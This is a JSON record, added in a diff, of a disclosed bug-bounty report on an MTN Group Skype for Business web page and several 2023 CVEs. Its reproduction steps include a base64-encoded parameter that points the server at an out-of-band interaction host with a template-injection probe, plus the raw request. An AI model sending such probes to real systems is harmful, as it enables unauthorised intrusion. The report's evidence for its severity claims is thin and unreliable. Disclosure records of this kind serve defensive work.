@@ -1,0 +1,144 @@
+{
+  "id": 2309291,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzA5Mjkx",
+  "url": "https://hackerone.com/reports/2309291",
+  "title": "CVE-2023-41763 Business Elevation of Privilege vulnerability on [.mtn.com]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-01-09T15:51:41.455Z",
+  "submitted_at": "2024-01-09T15:51:41.627Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "h0w",
+    "url": "/h0w",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fhzfzlvq1tflwrj6kpcrlujrnmlo/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-41763",
+    "CVE-2023-36780",
+    "CVE-2023-36786",
+    "CVE-2023-36789"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-22T15:49:20.268Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-23T15:49:15.370Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThe Microsoft Skype for Business installation on the remote host is missing security updates. the flaw was actively exploited. Attackers could access some sensitive information but not alter or restrict access to it. The impact relates primarily to confidentiality. It is, therefore, affected by multiple vulnerabilities:\n - An elevation of privilege vulnerability. An attacker can exploit this to gain elevated privileges.\n(CVE-2023-41763)\n - A remote code execution vulnerability. An attacker can exploit this to bypass authentication and execute unauthorized arbitrary commands. (CVE-2023-36780, CVE-2023-36786, CVE-2023-36789)\n\n\n## Steps To Reproduce:\n  1. Navigate visit  https://fec-feweb-ext.mtn.com/lwa/Webpages/LwaClient.aspx\n  1. Intercept request to burp-suite and send to repeater\n  1. Added `parameter-vulnerable` is `lwa/Webpages/LwaClient.aspx?meeturl=` I found this use recon\n  1. Used `base64` encode to add  payloads `template-injection`  `LMN%{1337*1337}#.xx`\n```\nhttp://attacker-payload-interact.sh/?id=LMN%{1337*1337}#.xx//\n```\n  1. Sent request again, and boom **This server has vulnerable:**\n\nHere's the HTTP Parameter request that the issue:\n```\nGET /lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8= HTTP/1.1\nHost: fec-feweb-ext.mtn.com\nSec-Ch-Ua: \nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"\"\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n``` \n```\nHTTP/1.1 200 OK\nCache-Control: private\n```\n\n## Supporting Material/References:\nMicrosoft has released KB5032429 to address this issue.\n\n\n{F2970073}\n\n{F2970077}\n\n## Impact\n\nThe Elevation of Privilege vulnerability, CVE-2023-41763, posed a significant security risk because it allowed attackers to potentially breach internet perimeters by exploiting Skype for Business. While the vulnerability primarily affected confidentiality, it could have led to the exposure of sensitive information that in turn might provide access to internal networks.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2970073,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pa2aba13qvysz6xufyg0njjjrbgw?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ22GI6AJO%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T172734Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDhkxULfbGHzrM%2BP4u130o5iNX449PnGMhMXB6ZQIgi7gIhAMYfP0xhrfX4mGnsrVJiHRmlfzhIdZ0zDUEle89WzG7LKrsFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igy%2F8rboJlHSGkM780UqjwWpqDwsLb4tFvRMTIqUkZ5yYr46yzZmIE%2BhWKvjpBJ4UVnArntWxN6j6AVdSV6aGrpMWhuuxejk75OcNvH3jL2om5SPnHnaJBfx15Rsgx%2Bc3AX8GYlsIYt5Nbi9LpjSfaZ0M9RfPtEKmX5MxQYQZwRsy9ZVOV8WrKJxfMGpavqOk4U7HptwDOrzIti2fuJAlmErSELhZJ1GP7F91SMHdArMWju%2FJty6VIT4sTe58dmvwv6t4u03%2Ffr7Zi9vrP5mwSxGfUsWKR0dJj9u7%2BySt3bFdTtcDpneF0cLNreOM2J9CaIWjcDW9ax4oAE8y88%2BadacB5hwJaUZDHhSRVkCGqoKq0cOuEmOoqKTj1gDW2D9X6H42FT4ocwpDE4Aw2Ayr5sVglV4YO6WUHe1EfPxNKiJWA1y8OLm10uMvYJsSUmqTJQB1QxsdbNPeNaVmRyKr7Y2iRK%2BleJUObm%2B%2BR%2BeyGaSMwmNwSBKhNYxb4AJGEGKLEFOAHzmVfS73MSl9vgsrC4W5TcIC6aDPx1WTSbZsjpQcf8%2BJr93CiCdsCvISKgMkU51q2sgIeQCBeKuRqr8xEVdUEyfj8r9fABEsOgJ%2FEgSYhXQQlY66NeTeTObe2rGyvidcRPQjcBMNUSx%2FVSI08cuDLu6cl3boN9i0zNRi5f7mgyz3q6H2IvGjEzdqKXCBz4Re%2BBP1kkM42Da%2BNN9funbR7tNkgXv1OqMbvOk5fIpn65l5qG9IpYpqiECdghjLuodeEmhmaQPXqxWoIJBR4Nrk8rf%2Faas5xyrz9HAn32OWhu3bbIHvF3Hhxuv9Xxzv9CbtKVul06zbVolbc6OG0ieIz9N37MsLJrT5eRcKzLVWqT3uQK%2FUeAhsjQD6PB6MMyEu8YGOrABd4hyrzlNmVpjVHJM68xEVKXzfWKaivAhDwsxId87nWVbfuZesu6zgqEYBzqTvAllTaNcYg06Nhxo1Obyn8ZpDu6%2BI5IJN7Ky%2BPwGrMoBkO0XPLRQ2e4GrIbay5n%2BiKUe4ia9WT7QarHwIEVtnuYIJ07fGM1p6brAJccQjYLPxryMQ716usw3v67Yf%2B5NoX%2FrtDZEsQbAdRplSMs9UgVA9xjYX95G6AultOWbprmbmcE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=168e2ecf3e902869d9035925293ea9923b30dd4639b8d2fa29e6a095596c157f",
+      "file_size": 139868,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2970077,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3nnisk2atinfjwtnvljguey42fly?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ22GI6AJO%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T172734Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDhkxULfbGHzrM%2BP4u130o5iNX449PnGMhMXB6ZQIgi7gIhAMYfP0xhrfX4mGnsrVJiHRmlfzhIdZ0zDUEle89WzG7LKrsFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igy%2F8rboJlHSGkM780UqjwWpqDwsLb4tFvRMTIqUkZ5yYr46yzZmIE%2BhWKvjpBJ4UVnArntWxN6j6AVdSV6aGrpMWhuuxejk75OcNvH3jL2om5SPnHnaJBfx15Rsgx%2Bc3AX8GYlsIYt5Nbi9LpjSfaZ0M9RfPtEKmX5MxQYQZwRsy9ZVOV8WrKJxfMGpavqOk4U7HptwDOrzIti2fuJAlmErSELhZJ1GP7F91SMHdArMWju%2FJty6VIT4sTe58dmvwv6t4u03%2Ffr7Zi9vrP5mwSxGfUsWKR0dJj9u7%2BySt3bFdTtcDpneF0cLNreOM2J9CaIWjcDW9ax4oAE8y88%2BadacB5hwJaUZDHhSRVkCGqoKq0cOuEmOoqKTj1gDW2D9X6H42FT4ocwpDE4Aw2Ayr5sVglV4YO6WUHe1EfPxNKiJWA1y8OLm10uMvYJsSUmqTJQB1QxsdbNPeNaVmRyKr7Y2iRK%2BleJUObm%2B%2BR%2BeyGaSMwmNwSBKhNYxb4AJGEGKLEFOAHzmVfS73MSl9vgsrC4W5TcIC6aDPx1WTSbZsjpQcf8%2BJr93CiCdsCvISKgMkU51q2sgIeQCBeKuRqr8xEVdUEyfj8r9fABEsOgJ%2FEgSYhXQQlY66NeTeTObe2rGyvidcRPQjcBMNUSx%2FVSI08cuDLu6cl3boN9i0zNRi5f7mgyz3q6H2IvGjEzdqKXCBz4Re%2BBP1kkM42Da%2BNN9funbR7tNkgXv1OqMbvOk5fIpn65l5qG9IpYpqiECdghjLuodeEmhmaQPXqxWoIJBR4Nrk8rf%2Faas5xyrz9HAn32OWhu3bbIHvF3Hhxuv9Xxzv9CbtKVul06zbVolbc6OG0ieIz9N37MsLJrT5eRcKzLVWqT3uQK%2FUeAhsjQD6PB6MMyEu8YGOrABd4hyrzlNmVpjVHJM68xEVKXzfWKaivAhDwsxId87nWVbfuZesu6zgqEYBzqTvAllTaNcYg06Nhxo1Obyn8ZpDu6%2BI5IJN7Ky%2BPwGrMoBkO0XPLRQ2e4GrIbay5n%2BiKUe4ia9WT7QarHwIEVtnuYIJ07fGM1p6brAJccQjYLPxryMQ716usw3v67Yf%2B5NoX%2FrtDZEsQbAdRplSMs9UgVA9xjYX95G6AultOWbprmbmcE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d34519a7368c9b9cf06aade88736213269e0c273f5b06292f7c0da03432d3cbf",
+      "file_size": 71504,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-02-22T15:49:15.572Z",
+  "allow_singular_disclosure_after": -18149899.189150307,
+  "singular_disclosure_allowed": true,
+  "vote_count": 42,
+  "voters": [
+    "k0ns0l",
+    "aboalezz",
+    "time1337",
+    "hossam13",
+    "newday_newlife",
+    "zsir",
+    "chigorin",
+    "starlox",
+    "raslanco",
+    "2026",
+    "and 32 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 34306,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
